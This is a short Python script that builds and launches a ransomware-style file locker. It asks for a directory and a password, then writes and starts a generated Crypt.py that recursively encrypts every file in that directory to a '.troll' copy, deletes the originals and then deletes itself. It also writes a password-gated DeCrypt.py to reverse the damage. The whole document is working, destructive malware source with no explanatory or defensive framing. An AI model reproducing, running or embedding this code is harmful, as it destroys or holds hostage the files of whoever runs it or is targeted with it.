import os
direct = input("Specify the target directory: ")
password = input("Enter the password: ")
with open("Crypt.py", "w") as crypt:
    crypt.write('''
import os
import sys
def crypt(file):
    import pyAesCrypt
    print('-' * 80)
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".troll", password, buffer_size)
    print("[Encrypt] '"+str(file)+".troll'")
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)
walk(r"'''+str(direct)+'''")
print('-' * 80)
os.remove(str(sys.argv[0]))
    ''')
os.system("start Crypt.py")






with open("DeCrypt.py", "w") as decrypt:
    decrypt.write('''
import os
import sys
# Decryption function
def decrypt(file):
    import pyAesCrypt
    print('-' * 80)
    password = "'''+str(password)+'''"
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    print("[Decrypt] '" + str(os.path.splitext(file)[0]) + "'")
    os.remove(file)
# Parsing
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except:
                pass
        else:
            walk(path)
user_pass=str(input("Password>>"))
if user_pass == "'''+str(password)+'''":
    walk(r"'''+str(direct)+'''")
    print('-' * 80)
    os.remove(str(sys.argv[0]))
else:
    print("Incorrect")
        ''')